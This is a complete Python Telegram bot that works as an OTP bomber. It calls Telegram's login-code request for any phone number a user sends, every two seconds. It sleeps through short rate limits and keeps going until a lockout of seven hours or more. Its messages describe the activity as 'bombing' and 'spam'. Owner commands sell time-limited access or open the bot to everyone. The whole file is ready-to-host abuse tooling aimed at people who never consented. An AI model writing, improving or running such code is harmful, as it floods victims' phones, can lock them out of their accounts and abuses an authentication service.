# language: Python, file: main.py, runtime: Python 3.10+
# Host-ready: reads BOT_TOKEN / API_ID / API_HASH / OWNER_IDS / OWNER_USERNAME from .env

import asyncio
import json
import logging
import os
import re
import time
from collections import defaultdict
from pathlib import Path

from dotenv import load_dotenv
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    FloodWaitError,
    PhoneNumberInvalidError,
    PhoneNumberBannedError,
)

load_dotenv()

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN")
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH")
OWNER_USERNAME = os.getenv("OWNER_USERNAME", "owner")  # shown to non-access users
# Comma-separated owner user IDs, e.g. 123456789,987654321
OWNER_IDS = {
    int(x.strip())
    for x in os.getenv("OWNER_IDS", "").split(",")
    if x.strip().isdigit()
}

if not BOT_TOKEN or not API_ID or not API_HASH:
    raise SystemExit("Missing BOT_TOKEN / API_ID / API_HASH in environment or .env")
if not OWNER_IDS:
    raise SystemExit("Missing OWNER_IDS in environment or .env (at least one owner required)")

MIN_LIMIT_HOURS = 7          # permanent stop threshold
SEND_INTERVAL = 2            # seconds between OTP requests
DATA_FILE = Path("bot_data.json")

# ─── STATE ────────────────────────────────────────────────────────────────────
active_jobs: dict[int, dict[str, asyncio.Task]] = defaultdict(dict)
PHONE_RE = re.compile(r"^\+\d{8,15}$")

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("otp_bot")


# ─── PERSISTENCE ──────────────────────────────────────────────────────────────
def load_data() -> dict:
    if DATA_FILE.exists():
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"access": {}, "open_mode": False}


def save_data(data: dict) -> None:
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)


def get_access() -> dict[str, float]:
    """user_id (str) → expiry unix timestamp"""
    return load_data().get("access", {})


def set_access(access: dict[str, float]) -> None:
    data = load_data()
    data["access"] = access
    save_data(data)


def is_open_mode() -> bool:
    return bool(load_data().get("open_mode", False))


def set_open_mode(value: bool) -> None:
    data = load_data()
    data["open_mode"] = value
    save_data(data)


def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS


def has_access(user_id: int) -> bool:
    if is_owner(user_id):
        return True
    if is_open_mode():
        return True
    access = get_access()
    key = str(user_id)
    if key not in access:
        return False
    if time.time() > access[key]:
        # expired — clean up
        del access[key]
        set_access(access)
        return False
    return True


def days_left(user_id: int) -> float:
    access = get_access()
    key = str(user_id)
    if key not in access:
        return 0.0
    remaining = access[key] - time.time()
    return max(0.0, remaining / 86400)


# ─── WORKER ───────────────────────────────────────────────────────────────────
async def otp_worker(user_id: int, phone: str, chat_id: int, bot):
    """
    Keep requesting OTP every SEND_INTERVAL seconds.
    - Any FloodWait on a number that is already rate-limited → stop + show remaining time.
    - Short FloodWait (< MIN_LIMIT_HOURS) while the number is still fresh → sleep and resume.
    - FloodWait ≥ MIN_LIMIT_HOURS → permanent stop for this job.
    """
    while True:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            await client.send_code_request(phone)
            log.info("OTP sent → %s (user %s)", phone, user_id)
        except FloodWaitError as e:
            wait = e.seconds
            hours = wait / 3600.0
            # Any FloodWait means the number is currently limited.
            # Permanent stop only when remaining wait ≥ MIN_LIMIT_HOURS.
            if hours >= MIN_LIMIT_HOURS:
                msg = (
                    f"🚫 OTP Sending Stopped!\n"
                    f"Number: {phone}\n"
                    f"Error: Telegram Rate Limit hit: You must wait ~{hours:.1f} hours "
                    f"before trying this number again.\n"
                    f"Stopping the process."
                )
                await bot.send_message(chat_id, msg)
                break
            else:
                # Short limit — sleep the exact wait, then resume.
                log.info(
                    "Short FloodWait %ss (%.2fh) on %s — sleeping then resume",
                    wait, hours, phone,
                )
                await asyncio.sleep(wait)
                continue
        except (PhoneNumberInvalidError, PhoneNumberBannedError) as e:
            await bot.send_message(chat_id, f"❌ {phone} rejected by Telegram: {e}")
            break
        except asyncio.CancelledError:
            raise
        except Exception as ex:
            log.warning("Transient error on %s: %s", phone, ex)
            await asyncio.sleep(5)
            continue
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass

        await asyncio.sleep(SEND_INTERVAL)

    # Cleanup job entry
    if phone in active_jobs.get(user_id, {}):
        del active_jobs[user_id][phone]
        if not active_jobs[user_id]:
            del active_jobs[user_id]


# ─── HELPERS ──────────────────────────────────────────────────────────────────
def is_valid_phone(text: str) -> bool:
    return bool(PHONE_RE.match(text.strip()))


async def start_job(user_id: int, phone: str, chat_id: int, bot) -> str:
    phone = phone.strip()
    if not is_valid_phone(phone):
        return (
            "❌ Invalid phone number format. "
            "Please include the country code (e.g., +919876543210)."
        )

    if phone in active_jobs.get(user_id, {}):
        return (
            f"⚠️ You are already bombing {phone}! "
            f"To stop it, use /stop {phone}."
        )

    task = asyncio.create_task(otp_worker(user_id, phone, chat_id, bot))
    active_jobs[user_id][phone] = task

    return (
        f"🚀 Started sending OTPs to {phone}!\n"
        f"I will keep sending every {SEND_INTERVAL} seconds until a ≥{MIN_LIMIT_HOURS}h "
        f"limit is reached or you use /stop."
    )


async def stop_jobs(user_id: int, phone: str | None = None) -> str:
    jobs = active_jobs.get(user_id, {})
    if not jobs:
        return "⚠️ No active processes found for you."

    if phone:
        phone = phone.strip()
        task = jobs.pop(phone, None)
        if task is None:
            return f"⚠️ No active process found for {phone}."
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass
        if not jobs:
            del active_jobs[user_id]
        return "🛑 Stopped 1 active OTP process."

    count = len(jobs)
    for t in list(jobs.values()):
        t.cancel()
    for t in list(jobs.values()):
        try:
            await t
        except asyncio.CancelledError:
            pass
    del active_jobs[user_id]
    return f"🛑 Stopped {count} active OTP process(es)."


def access_denied_text() -> str:
    return (
        "🔒 Access denied.\n"
        f"Contact the owner @{OWNER_USERNAME} to get access."
    )


# ─── HANDLERS ─────────────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not has_access(uid):
        await update.message.reply_text(access_denied_text())
        return

    text = (
        "👋 Welcome to the OTP Bot.\n\n"
        "This bot sends OTPs to a phone number every 2 seconds until a long rate-limit is hit.\n\n"
        "📌 Private chat: just send the phone number (with country code).\n"
        "📌 Group chat: /spam +919876543210\n"
        "/stop — stop all your jobs\n"
        "/stop +919876543210 — stop one number\n"
    )
    if is_owner(uid):
        text += (
            "\n── Owner commands ──\n"
            "/adduser <user_id> <days>\n"
            "/removeuser <user_id>\n"
            "/showuser\n"
            "/open  — allow everyone\n"
            "/lock  — restrict to accessed users only\n"
        )
    await update.message.reply_text(text)


async def cmd_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not has_access(uid):
        await update.message.reply_text(access_denied_text())
        return

    if not context.args:
        await update.message.reply_text("Usage: /spam +919876543210")
        return
    phone = context.args[0]
    reply = await start_job(uid, phone, update.effective_chat.id, context.bot)
    await update.message.reply_text(reply)


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not has_access(uid):
        await update.message.reply_text(access_denied_text())
        return

    phone = context.args[0] if context.args else None
    reply = await stop_jobs(uid, phone)
    await update.message.reply_text(reply)


async def private_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private":
        return
    uid = update.effective_user.id
    if not has_access(uid):
        await update.message.reply_text(access_denied_text())
        return

    text = update.message.text.strip()
    if not text.startswith("+"):
        return
    reply = await start_job(uid, text, update.effective_chat.id, context.bot)
    await update.message.reply_text(reply)


# ─── OWNER COMMANDS ───────────────────────────────────────────────────────────
async def cmd_adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text("❌ Owners only.")
        return

    if len(context.args) < 2:
        await update.message.reply_text("Usage: /adduser <user_id> <days>")
        return

    try:
        target = int(context.args[0])
        days = float(context.args[1])
        if days <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ user_id must be integer, days must be positive number.")
        return

    access = get_access()
    access[str(target)] = time.time() + days * 86400
    set_access(access)
    await update.message.reply_text(
        f"✅ User {target} granted access for {days} day(s).\n"
        f"Expires in {days_left(target):.1f} days."
    )


async def cmd_removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text("❌ Owners only.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /removeuser <user_id>")
        return

    try:
        target = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ user_id must be an integer.")
        return

    access = get_access()
    key = str(target)
    if key in access:
        del access[key]
        set_access(access)
        await update.message.reply_text(f"✅ User {target} removed.")
    else:
        await update.message.reply_text(f"⚠️ User {target} was not in the access list.")


async def cmd_showuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text("❌ Owners only.")
        return

    access = get_access()
    if not access:
        await update.message.reply_text("No accessed users.")
        return

    lines = ["📋 Accessed users:"]
    now = time.time()
    # clean expired while listing
    expired = []
    for key, exp in access.items():
        remaining = exp - now
        if remaining <= 0:
            expired.append(key)
            continue
        days = remaining / 86400
        lines.append(f"• ID: {key}  —  {days:.1f} day(s) left")

    for key in expired:
        del access[key]
    if expired:
        set_access(access)

    if len(lines) == 1:
        await update.message.reply_text("No accessed users (all expired).")
    else:
        await update.message.reply_text("\n".join(lines))


async def cmd_open(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text("❌ Owners only.")
        return
    set_open_mode(True)
    await update.message.reply_text("🔓 Bot is now OPEN — anyone can use it.")


async def cmd_lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid):
        await update.message.reply_text("❌ Owners only.")
        return
    set_open_mode(False)
    await update.message.reply_text("🔒 Bot is now LOCKED — only accessed users + owners.")


# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("spam", cmd_spam))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("adduser", cmd_adduser))
    app.add_handler(CommandHandler("removeuser", cmd_removeuser))
    app.add_handler(CommandHandler("showuser", cmd_showuser))
    app.add_handler(CommandHandler("open", cmd_open))
    app.add_handler(CommandHandler("lock", cmd_lock))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, private_number))

    log.info("Bot starting… owners=%s open_mode=%s", OWNER_IDS, is_open_mode())
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()